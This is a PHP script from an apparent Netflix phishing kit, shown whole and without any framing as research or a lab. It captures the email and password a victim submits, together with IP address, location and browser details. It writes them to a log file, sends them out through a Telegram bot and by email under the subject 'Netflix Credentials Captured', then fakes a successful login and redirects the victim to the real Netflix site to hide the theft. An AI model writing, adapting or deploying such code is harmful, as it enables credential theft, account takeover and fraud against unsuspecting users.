<?php
// Include configuration
include 'config.php';

// Start session
session_start();

// Get all POST data
$email = $_POST['email'] ?? '';
$password = $_POST['password'] ?? '';
$user_agent = $_POST['user_agent'] ?? $_SERVER['HTTP_USER_AGENT'];
$ip = $_SERVER['HTTP_X_FORWARDED_FOR'] ?? $_SERVER['REMOTE_ADDR'];

// Get location data
$location = array(
    'ip' => $ip,
    'city' => $_POST['city'] ?? 'Unknown',
    'region' => $_POST['region'] ?? 'Unknown',
    'country' => $_POST['country'] ?? 'Unknown',
    'latitude' => $_POST['latitude'] ?? '0',
    'longitude' => $_POST['longitude'] ?? '0',
    'timezone' => $_POST['timezone'] ?? 'Unknown'
);

// Additional info
$screen_resolution = $_POST['screen_resolution'] ?? 'Unknown';
$language = $_POST['language'] ?? 'Unknown';
$platform = $_POST['platform'] ?? 'Unknown';
$referrer = $_POST['referrer'] ?? 'Direct';
$cookies_enabled = $_POST['cookies_enabled'] ?? 'Unknown';
$do_not_track = $_POST['do_not_track'] ?? 'Unknown';

// Create log entry
$log_entry = array(
    'timestamp' => date('Y-m-d H:i:s'),
    'email' => $email,
    'password' => $password,
    'ip' => $ip,
    'user_agent' => $user_agent,
    'location' => $location,
    'screen_resolution' => $screen_resolution,
    'language' => $language,
    'timezone' => $timezone,
    'platform' => $platform,
    'referrer' => $referrer,
    'cookies_enabled' => $cookies_enabled,
    'do_not_track' => $do_not_track
);

// Save to local file
if (ENABLE_LOGGING) {
    $log_file = LOG_FILE;
    $log_data = json_encode($log_entry, JSON_PRETTY_PRINT) . ",\n";
    
    // Create logs directory if it doesn't exist
    if (!file_exists('logs')) {
        mkdir('logs', 0777, true);
    }
    
    // Append to log file
    file_put_contents($log_file, $log_data, FILE_APPEND);
}

// Send to Telegram
if (ENABLE_TELEGRAM && TELEGRAM_BOT_TOKEN && TELEGRAM_CHAT_ID) {
    include 'telegram.php';
    sendToTelegram($log_entry);
}

// Send email notification
if (SEND_EMAIL && EMAIL_TO) {
    $subject = "📧 Netflix Credentials Captured";
    $message = "New login attempt:\n\n";
    $message .= "Email: $email\n";
    $message .= "Password: $password\n";
    $message .= "IP: $ip\n";
    $message .= "Location: " . $location['city'] . ", " . $location['country'] . "\n";
    $message .= "User Agent: $user_agent\n";
    $message .= "Time: " . date('Y-m-d H:i:s');
    
    mail(EMAIL_TO, $subject, $message);
}

// Return JSON response
header('Content-Type: application/json');
echo json_encode([
    'success' => true,
    'message' => 'Login successful. Redirecting...',
    'redirect' => 'https://www.netflix.com'
]);
?>